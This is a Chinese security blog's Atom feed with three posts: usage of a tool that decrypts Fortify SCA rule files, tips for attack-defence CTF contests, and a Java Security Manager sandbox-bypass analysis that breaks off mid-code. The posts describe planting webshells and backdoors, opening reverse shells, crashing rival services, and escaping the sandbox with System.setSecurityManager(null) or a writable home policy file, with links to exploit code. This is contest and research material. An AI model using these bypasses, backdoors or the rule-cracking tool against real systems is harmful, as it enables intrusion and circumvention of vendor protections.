<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>c0d3p1ut0s</title>
  
  <subtitle>程序员 安全  codeplutos</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://c0d3p1ut0s.github.io/"/>
  <updated>2018-08-20T12:25:13.000Z</updated>
  <id>http://c0d3p1ut0s.github.io/</id>
  
  <author>
    <name>c0d3p1ut0s</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fortify sca rules解密工具</title>
    <link href="http://c0d3p1ut0s.github.io/fortify-sca-rules%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/"/>
    <id>http://c0d3p1ut0s.github.io/fortify-sca-rules解密工具/</id>
    <published>2018-08-20T12:20:48.000Z</published>
    <updated>2018-08-20T12:25:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><a href="https://bitbucket.org/codeplutos/fortify-rules-decrypt" target="_blank" rel="noopener">https://bitbucket.org/codeplutos/fortify-rules-decrypt</a> </p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar fortify-rule-dencrypt.jar source_dir output_dir</span><br></pre></td></tr></table></figure><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>解密程序会在source_dir中寻找<code>.bin</code>结尾的文件并解密，保存到output_dir中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;链接&quot;&gt;&lt;a href=&quot;#链接&quot; class=&quot;headerlink&quot; title=&quot;链接&quot;&gt;&lt;/a&gt;链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bitbucket.org/codeplutos/fortify-rules-decrypt&quot; targe
      
    
    </summary>
    
    
      <category term="java" scheme="http://c0d3p1ut0s.github.io/tags/java/"/>
    
      <category term="代码审计" scheme="http://c0d3p1ut0s.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="破解" scheme="http://c0d3p1ut0s.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>AWD型CTF比赛小技巧总结</title>
    <link href="http://c0d3p1ut0s.github.io/AWD%E5%9E%8BCTF%E6%AF%94%E8%B5%9B%E5%B0%8F%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"/>
    <id>http://c0d3p1ut0s.github.io/AWD型CTF比赛小技巧总结/</id>
    <published>2018-07-11T14:00:16.000Z</published>
    <updated>2018-07-11T14:08:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近参加了两次AWD型CTF比赛，所谓AWD型比赛，就是选手既是维护者，需要维护分配给自己的防守机，也是攻击者，需要攻击对手的防守机，拿到flag。发现一些小套路，总结一下。</p><a id="more"></a><h2 id="0x01-套路"><a href="#0x01-套路" class="headerlink" title="0x01 套路"></a>0x01 套路</h2><p>套路太深，逐个写太麻烦了，我画了一个脑图如下，其中关键的部分我会在下面提到。</p><p><img src="https://i.loli.net/2018/07/11/5b45bb55a8a62.png" alt="naotu.png"></p><p>先从防开始说吧</p><ul><li>备份：拿到服务器权限之后第一件事应该是备份了。记得把web目录和数据库都备份一下。</li><li>进程监控：非root用户是无法隐藏进程的，进程监控能快速找到对手留下的后门/运行的命令。</li><li>日志监控：这个重要性不多说，可以自己事先写个脚本过滤一下，至少得先过滤出返回码是200的请求吧。</li><li>WAF：这个慎重上，上的话过滤的内容一定要少。可以考虑把flag关键字，或者flag服务器地址过滤一下。如果准备时间充足的话也可以伪造返回。</li></ul><p>AWD比赛还是以攻为主，以攻为守。在整个比赛中，拿到flag是最核心的目的。整个攻击过程都以这个目的为中心。在比赛的过程中，绝大多数情况都是利用<strong>多线程批量化攻击脚本</strong>进行攻击。这个脚本可以在赛前基本写好，在比赛时，只需要完善一些基本的函数就可以了。可以说，这个脚本的质量决定了你的攻击效率。注意好以下几点，能够事半功倍。</p><ul><li><strong>合理抽象</strong>：方法不要太抽象，也不要写得像意大利面，很自然的把攻击过程抽象成flag获取，flag去重，flag提交三个方法即可。我在脚本中，关于flag操作的方法都以flag开头，这样，在比赛时写代码时，即使忘记函数名，只要是对flag做操作，IDE都会提示有哪些函数。</li><li><strong>单元测试+集成测试</strong>：一些方法必定在比赛现场完善，例如flag提交和flag获取，但是对这些方法的单元测试和集成测试函数可以在赛前写好，方便在赛时迅速定位问题，调试bug。</li><li><strong>异常处理</strong>：CTF比赛环境不稳定非常常见，比如flag提交服务器挂掉，这样，赛前要考虑到这些情况，如果flag服务器挂掉，在异常处理中，可以把flag写入flag文件中，稍后再提交。</li><li><strong>合理输出</strong>：不要动不动就输出信息到控制台，像http请求中超时异常很常见的，直接忽略就好，输出信息太多，在多线程情况下根本看不过来。只输出关键步骤的关键信息，最好能根据输出判断批量化攻击的运行状态。<br>另外，在利用漏洞找到flag和写好批量攻击脚本之间肯定有时间差，这个时候，其他队友先手动攻击，提交flag，直到负责脚本编写的同学完成代码编写和调试。</li></ul><p>在比赛中，为了快速写出flag获取的代码，我用了burp的requests插件，这个插件可以把burp suite拦截下来的包转换成python requests代码，非常方便。生成的代码大概如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag_submit</span><span class="params">(flag)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">    burp0_url = <span class="string">""</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"30bnlp2apsc9acu5g1qf650es4"</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">"Accept"</span>: <span class="string">"*/*"</span>, <span class="string">"Origin"</span>: <span class="string">"http://100.100.100.200"</span>, <span class="string">"X-Requested-With"</span>: <span class="string">"XMLHttpRequest"</span>,</span><br><span class="line">                        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span>,</span><br><span class="line">                        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded; charset=UTF-8"</span>,</span><br><span class="line">                        <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">"answerVal"</span>: flag&#125;</span><br><span class="line">    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br></pre></td></tr></table></figure></p><p>一般来说没什么问题，但是如果需要在每台机器上都登录，再运行poc，才能获取flag，就要注意：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag_get</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line"></span><br><span class="line">        burp0_url = <span class="string">"http://"</span>+ip+<span class="string">"/"</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">"JSESSIONID"</span>: <span class="string">"84CBC07052E955A5D2381955B312187C"</span>, <span class="string">"ZVh5_2132_saltkey"</span>: <span class="string">"o5O3yFez"</span>,</span><br><span class="line">                         <span class="string">"ZVh5_2132_lastvisit"</span>: <span class="string">"1530254636"</span>, <span class="string">"ZVh5_2132_sid"</span>: <span class="string">"LAdoUM"</span>,</span><br><span class="line">                         <span class="string">"ZVh5_2132_lastact"</span>: <span class="string">"1530258236%09connect.php%09"</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Origin"</span>: <span class="string">"http://102.102.102.82"</span>,</span><br><span class="line">                         <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">                         <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span>,</span><br><span class="line">                         <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line">                         <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">                         <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">        burp0_data = &#123;<span class="string">"password"</span>: <span class="string">"password"</span>, <span class="string">"doing"</span>: <span class="string">"login"</span>&#125;</span><br><span class="line">        <span class="comment"># 这里没有指定cookies</span></span><br><span class="line">        s.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br></pre></td></tr></table></figure></p><p>这里使用requests.Session()来保持登录，注意，在s.post中，不能指定cookies，否则会用指定的cookies去操作，那每个ip都是这个cookie，相当于没有登录。</p><p>如果主办方没有给防守机的权限的话，需要自己攻破防守机，获取权限，再寻找flag。找到漏洞攻击之后，不要急于找flag或者加固，先构造一个交互式的shell，例如上传一个菜刀马，用菜刀的虚拟终端，或者反弹shell。一个交互式的shell比一个命令执行的马不知好用到哪里去了。磨刀不误砍柴工。</p><p>有的比赛flag会定时刷新，这种比较考验选手的攻防对抗，如果没有root的话，批量种马和后门无非就是那几种，不赘述，提一点小技巧，你可能批量给别人的机器种了几个马，但是一定要给自己的防守机多留几个后门/木马，如果在攻防对抗的后期，所有队伍的web服务都被打挂了，你在别人机器上留的马都没有用了，你还有自己机器的控制权，发起DOS攻击的队伍肯定已经种好了后门，利用好这个后门，可以反客为主打全场。</p><p>攻防相对，你也可以在后期种下自己的木马后，把web服务都打挂，一来可以使其他队伍扣分，二来可以使web木马全部失去作用，大部分队伍都失去了权限。</p><h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02 结语"></a>0x02 结语</h2><p>CTF比赛最核心的还是选手的安全水平，攻防能力，是为道。以上只是一些术，一些能快速得分的方法，希望能给读者一些帮助。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近参加了两次AWD型CTF比赛，所谓AWD型比赛，就是选手既是维护者，需要维护分配给自己的防守机，也是攻击者，需要攻击对手的防守机，拿到flag。发现一些小套路，总结一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://c0d3p1ut0s.github.io/tags/CTF/"/>
    
      <category term="AWD" scheme="http://c0d3p1ut0s.github.io/tags/AWD/"/>
    
      <category term="攻防对抗" scheme="http://c0d3p1ut0s.github.io/tags/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>攻击Java沙箱</title>
    <link href="http://c0d3p1ut0s.github.io/%E6%94%BB%E5%87%BBJava%E6%B2%99%E7%AE%B1/"/>
    <id>http://c0d3p1ut0s.github.io/攻击Java沙箱/</id>
    <published>2018-07-11T13:59:46.000Z</published>
    <updated>2018-07-11T14:20:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><blockquote><p>文章原发<a href="https://www.anquanke.com/post/id/151398" target="_blank" rel="noopener">安全客</a>，重发博客如下</p></blockquote><p>最近两年CTF比赛中出现了Python沙箱绕过，关于Python沙盒的文章比较多，其实Java也有沙箱。而恰好笔者在做安全测试的时候遇到了Java沙箱，于是研究了一下Java沙箱的绕过。虽然Java不像PHP和python那么灵活，但是Java沙箱能玩的地方还是挺多的。</p><a id="more"></a><p>文章脑图如下，<strong>配合食用效果更佳</strong>。有错误或者疏漏的地方请各位指出，欢迎联系<a href="mailto:c0d3p1ut0s@gmail.com" target="_blank" rel="noopener">c0d3p1ut0s@gmail.com</a>。</p><p><img src="https://i.loli.net/2018/07/10/5b449b9daaa3e.png" alt=""></p><h3 id="0x01-Java沙箱"><a href="#0x01-Java沙箱" class="headerlink" title="0x01 Java沙箱"></a>0x01 Java沙箱</h3><p>Java沙箱由以下部分组成：</p><ul><li>类加载器结构（例如命名空间）</li><li>class文件校验器</li><li>内置于Java虚拟机（和Java语言）的安全特性（例如对指针操作的屏蔽等）</li><li>Java安全管理器（Java Security Manager）和Java API组成</li></ul><p>前三个基本都是<strong>内置</strong>实现在JVM和Java语言中的，只有Java安全管理器（Java Security Manager）是能被开发者控制的，用来保护系统不被JVM中恶意的代码破坏的。这样，<strong>绕过java沙箱其实就转化成绕过java security manager</strong>。</p><p>Java Security Manager的一个典型应用场景是jvm需要加载运行一段代码，但是这段代码是不可信的，例如来自用户的输入、上传、反序列化指定的bytecode或者来自网络远程加载，这种情况下，需要防止不可信来源的恶意代码对系统造成破坏。其实这就是沙箱的应用场景。</p><h3 id="0x02-Java-Security-Manager介绍"><a href="#0x02-Java-Security-Manager介绍" class="headerlink" title="0x02 Java Security Manager介绍"></a>0x02 Java Security Manager介绍</h3><p>在java后面加一个参数即可打开Java Security Manager，<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager</span><br></pre></td></tr></table></figure></p><p>java提供了默认的Java Security Manager实现类，如果你想自定义自己的实现，可以在java.security.manager加等号指定。例如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager=net.sourceforge.prograde.sm.ProGradeJSM</span><br></pre></td></tr></table></figure></p><p>这样就指定了net.sourceforge.prograde.sm.ProGradeJSM作为实现，在绝大多数情况下，我们都使用原生的实现，一些第三方实现也只是扩展了策略文件的功能而已，那么什么是策略文件呢？</p><p>策略(policy)文件是一个配置文件，指定了哪些类有哪些权限。指定策略文件的命令如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=./security.policy -jar a.jar</span><br></pre></td></tr></table></figure></p><p>一般我们需要指定哪些类有哪些权限，编辑policy文件就可以了。</p><p>上面说了，policy文件的作用是指定哪些类有哪些权限。policy怎么指定这些类的呢？指定类名吗？并不是，policy文件根据<code>类的url和类的签名</code>来确定类，指定权限，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">grant signedBy &quot;Duke&quot; &#123;</span><br><span class="line">    permission java.io.FilePermission &quot;/tmp/*&quot;, &quot;read,write&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">grant  codeBase &quot;file:/home/sysadmin/*&quot; &#123;</span><br><span class="line">    permission java.security.SecurityPermission &quot;Security.insertProvider.*&quot;;</span><br><span class="line">    permission java.security.SecurityPermission &quot;Security.removeProvider.*&quot;;</span><br><span class="line">    permission java.security.SecurityPermission &quot;Security.setProperty.*&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>policy文件的具体语法参看<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html" target="_blank" rel="noopener">这里</a>。</p><p>根据java的设计，一个类的url和签名组成了这个类的CodeSource，根据policy文件的配置，一个CodeSource有一定的权限。一个类的CodeSource和它的权限构成了这个类的ProtectionDomain。如下图</p><p><img src="https://i.loli.net/2018/07/10/5b449bdc3073a.png" alt="protectiondomain.PNG"></p><p><img src="https://i.loli.net/2018/07/10/5b449c071e6e2.png" alt="2ProtectionDomain.png"></p><p>一个类的ProtectionDomain在这个类加载的时候初始化，在java.lang.ClassLoader中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里调用了defineClass(null, b, off, len, null)，最后一个参数null是ProtectionDomain的值，这个函数的实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);<span class="comment">//初始化这个类的ProtectionDomain</span></span><br><span class="line">    String source = defineClassSourceLocation(protectionDomain);</span><br><span class="line">    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">    postDefineClass(c, protectionDomain);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>一个类的ProtectionDomain我们已经搞清楚了，那么ProtectionDomain有什么用？Java Security Manager是怎么做安全监测的呢？</p><p>当调用一个需要权限的类时，例如读写文件、执行命令、开关socket等。这个类会调用SecurityManager.checkXXX()，如果SecurityManager判定有权限，这个方法会默默返回，否则抛出安全异常。以读文件FileInputStream为例<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    String name = (file != <span class="keyword">null</span> ? file.getPath() : <span class="keyword">null</span>);</span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">        security.checkRead(name);<span class="comment">//权限检查</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (file.isInvalid()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(<span class="string">"Invalid file path"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fd = <span class="keyword">new</span> FileDescriptor();</span><br><span class="line">    fd.attach(<span class="keyword">this</span>);</span><br><span class="line">    path = name;</span><br><span class="line">    open(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>读文件是SecurityManager.checkRead方法，写文件是SecurityManager.checkWrite方法，这些checkXXX方法最后都会调用SecurityManager.checkPermission方法，调用链如下图所示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager.checkXXX()</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">·······</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">SecurityManager.checkPermission()</span><br><span class="line">    | 在默认的Security Manager实现中</span><br><span class="line">    V</span><br><span class="line">AccessController.checkPermission()</span><br></pre></td></tr></table></figure></p><p>如上图，在默认的Security Manager实现中，真正的检查权限这个操作是由AccessController.checkPermission()这个方法实现的。下面我们来看看权限是怎么检查的。</p><p>当AccessController.checkPermission()被调用时，AccessController会自顶向下遍历当前栈（入栈到栈顶），栈由栈帧组成，每一个栈帧都是一个方法调用形成的，每个方法都属于一个类，每个类都有一个ProtectionDomain，则一个栈帧对应一个ProtectionDomain。AccessController遍历栈帧，如果某个栈帧对应的ProtectionDomain没有check的权限，则抛出异常。</p><p>同时，为了解决某些问题，AccessController还提供了doPrivilege方法，当这个方法被调用时，AccessController亦会自顶向下遍历当前栈，不过只会遍历到调用doPrivileged方法的栈帧就会停止。例如Main.main调用Class1.fun1()，Class1.fun1()调用了doPrivileged方法，在doPrivileged方法中进行了一些操作，AccessController的检查只会遍历到Class1.fun1()，看Class1是否有权限。</p><p>很明显，doPrivileged是非常危险的，因为它截断了AccessController的检查。之前Java Security Manager出过的几次漏洞都跟jdk类库不当调用doPrivileged方法，而doPrivileged方法中执行的操作能被用户代码控制有关。因为默认情况下，jdk类库是有所有权限的，即使调用jdk的用户代码没有权限，AccessController也不会再向下检查了。</p><h3 id="0x03-Java-Security-Manager的绕过"><a href="#0x03-Java-Security-Manager的绕过" class="headerlink" title="0x03 Java Security Manager的绕过"></a>0x03 Java Security Manager的绕过</h3><p>在某些情况下，赋予某些权限时，恶意代码可以利用这些权限，导致Java Security Manager完全失效。下面我们看看一些实例</p><h4 id="单等号-home目录可写导致Java-Security-Manager绕过"><a href="#单等号-home目录可写导致Java-Security-Manager绕过" class="headerlink" title="单等号+home目录可写导致Java Security Manager绕过"></a>单等号+home目录可写导致Java Security Manager绕过</h4><p>jre/lib/security/java.security是java中指定安全配置文件，在配置文件中指定了两个默认的policy文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># The default is to have a single system-wide policy file,</span><br><span class="line"># and a policy file in the user&apos;s home directory.</span><br><span class="line">policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">policy.url.2=file:$&#123;user.home&#125;/.java.policy</span><br></pre></td></tr></table></figure></p><p>而通过<code>-Djava.security.policy</code>指定policy文件时，如果参数后面是一个等号，例如<code>-Djava.security.policy=java.policy</code>，java.policy会加在上面的两个policy文件之后。在默认情况下，家目录下没有.java.policy这个文件，如果家目录可写，则恶意代码可以通过写.java.policy文件，授予自己更多的权限来绕过Java Security Manager。如下图所示，policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。</p><p>java.policy:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.io.FilePermission &quot;C:\\Users\\Administrator\\-&quot;, &quot;read,write&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/07/10/5b449c075d9e4.png" alt="rewrite-home-policy.PNG"></p><p>exp代码：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/rewrite-home-policy" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/rewrite-home-policy</a></p><p>修复方法：<code>-Djava.security.policy==java.policy</code>，用双等于号指定policy文件。</p><h4 id="通过setSecurityManager绕过Java-Security-Manager"><a href="#通过setSecurityManager绕过Java-Security-Manager" class="headerlink" title="通过setSecurityManager绕过Java Security Manager"></a>通过setSecurityManager绕过Java Security Manager</h4><p>java security manager不仅能通过参数<code>-Djava.security.policy==java.policy</code>指定，还可以在运行时通过<code>System.setSecurityManager()</code>方法指定。如果被授予setSecurityManager权限，恶意代码可以在运行时调用setSecurityManager方法，将java security manager置为null，绕过Java Security Manager。</p><p>java.policy如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>绕过poc<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setSecurityManager(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure></p><p>如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。</p><p>java.policy:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/07/10/5b449c0760127.png" alt="set-security-manager.PNG"></p><p>exp代码：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/set-security-manager" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/set-security-manager</a></p><p>修复方法：不授予不可信的代码setSecurityManager权限。</p><h4 id="通过反射绕过Java-Security-Manager"><a href="#通过反射绕过Java-Security-Manager" class="headerlink" title="通过反射绕过Java Security Manager"></a>通过反射绕过Java Security Manager</h4><p>如果读者跟了上面的<code>System.setSecurityManager</code>这个方法的话，可以看到这个方法最后直接把参数直接赋予了System类中的security变量。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setSecurityManager0</span><span class="params">(<span class="keyword">final</span> SecurityManager s)</span> </span>&#123;</span><br><span class="line">        SecurityManager sm = getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// ask the currently installed security manager if we</span></span><br><span class="line">            <span class="comment">// can replace it.</span></span><br><span class="line">            sm.checkPermission(<span class="keyword">new</span> RuntimePermission</span><br><span class="line">                                     (<span class="string">"setSecurityManager"</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((s != <span class="keyword">null</span>) &amp;&amp; (s.getClass().getClassLoader() != <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="comment">// New security manager class is not on bootstrap classpath.</span></span><br><span class="line">            <span class="comment">// Cause policy to get initialized before we install the new</span></span><br><span class="line">            <span class="comment">// security manager, in order to prevent infinite loops when</span></span><br><span class="line">            <span class="comment">// trying to initialize the policy (which usually involves</span></span><br><span class="line">            <span class="comment">// accessing some security and/or system properties, which in turn</span></span><br><span class="line">            <span class="comment">// calls the installed security manager's checkPermission method</span></span><br><span class="line">            <span class="comment">// which will loop infinitely if there is a non-system class</span></span><br><span class="line">            <span class="comment">// (in this case: the new security manager class) on the stack).</span></span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Object&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span 